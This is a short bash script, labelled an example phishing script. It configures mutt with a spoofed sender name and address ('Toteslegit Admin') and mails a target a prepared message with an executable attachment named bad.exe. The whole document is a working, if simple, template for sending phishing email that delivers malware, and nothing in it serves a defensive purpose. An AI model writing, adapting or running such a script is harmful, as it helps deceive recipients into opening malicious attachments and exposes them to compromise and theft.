#!/bin/bash
# Example phishing script.

# set .muttrc file
echo 'set edit_headers=yes' > /root/.muttrc 
echo 'set from = "toteslegit@domain.com"' >> /root/.muttrc
echo 'set realname = "Toteslegit Admin"' >> /root/.muttrc

# NOTE: you need to make an email body message and save it as body.txt in the root folder
# NOTE: if you had an attachment then add that to the /root/scripts/phish directory.
echo "" | mutt -s "Put your subject here" -i /root/scripts/phish/body.txt -a /root/scripts/phish/bad.exe -- target@domain.com
